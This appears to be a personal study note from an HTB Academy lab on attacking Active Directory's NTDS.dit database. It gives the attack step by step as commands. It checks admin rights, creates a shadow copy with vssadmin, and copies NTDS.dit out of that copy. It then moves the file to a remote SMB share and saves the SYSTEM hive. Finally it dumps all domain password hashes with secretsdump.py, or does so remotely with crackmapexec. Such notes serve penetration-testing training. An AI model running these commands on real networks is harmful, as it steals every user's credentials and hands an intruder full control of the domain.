# Attacking Active Directory NTDS.dit

![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/5695c495-1b02-471a-9aac-cc2a54a8155d)

Once a Windows system is joined to a domain, it will no longer default to _referencing the SAM database to validate logon requests_
Keep in mind that we can also study NTDS attacks by keeping track of this [technique](https://attack.mitre.org/techniques/T1003/003/).

# Capturing NTDS.dit
The `.dit` stands for directory information tree. This is the primary database file associated with AD and stores all domain **usernames**, password **hashes**, and other critical schema information.
`NT Directory Services (NTDS)` is the directory service used with AD to find & organize network resources. Recall that `NTDS.dit` file is stored at %systemroot$/ntds on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model).

To make a copy of the `NTDS.dit` file, we need `local admin` (Administrators group) or `Domain Admin` (Domain Admins group) (or equivalent) rights.<br>
Checking local group membership from powershell:
```bash
net localgroup
```
Checking User Account Privileges including Domain
```bash
net user username
```
This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the NTDS.dit file.

# Creating Shadow Copy of C:
From powershell:
```bash
vssadmin CREATE SHADOW /For=C:
```
![image](https://github.com/offensivecyber03/htbacademy/assets/71892943/675095d8-1f51-41d8-bb56-4baa179f2d3e)

## Copying NTDS.dit from the VSS
```bash
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS.dit
```
To transfer file into linux smb server:
```bash
PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```
After transfering .dit file we also need system hive to dump hashes.
`reg.exe save hklm\system C:\system.save` and then transfer it too.
## Dumping hashes
```bash
sudo python3 secretsdump.py -system system.save -ntds NTDS.dit local
```

## Capturing ntds from linux
```bash
crackmapexec smb 10.129.201.57 -u username -p password --ntds
```
